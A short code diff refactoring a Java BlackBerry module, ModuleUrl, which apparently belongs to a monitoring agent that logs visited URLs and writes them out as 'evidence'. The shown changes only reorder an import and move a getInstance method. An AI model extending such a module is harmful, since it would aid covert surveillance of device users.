@@ -13,9 +13,9 @@ import java.util.Date;
 import java.util.Vector;
 
 import net.rim.device.api.system.Backlight;
-import blackberry.ModuleManager;
 import blackberry.AppListener;
 import blackberry.Device;
+import blackberry.ModuleManager;
 import blackberry.config.ConfModule;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -44,7 +44,14 @@ public final class ModuleUrl extends BaseModule implements ApplicationObserver,
     private boolean seen = true;
     //Timer applicationTimer;
     private static final long APP_TIMER_PERIOD = 5000;
-
+    
+    public static String getStaticType() {
+        return "url";
+    }
+    
+    public static ModuleUrl getInstance() {
+        return (ModuleUrl) ModuleManager.getInstance().get(getStaticType());
+    }
     
     protected boolean parse(ConfModule conf) {
         if (Device.getInstance().atLeast(6, 0)) {
@@ -171,10 +178,6 @@ public final class ModuleUrl extends BaseModule implements ApplicationObserver,
         evidence.writeEvidences(items);
         evidence.close();
 
-    }
-
-    public static ModuleUrl getInstance() {
-        return (ModuleUrl) ModuleManager.getInstance().get("url");
     }
 
     //#ifdef DEBUG
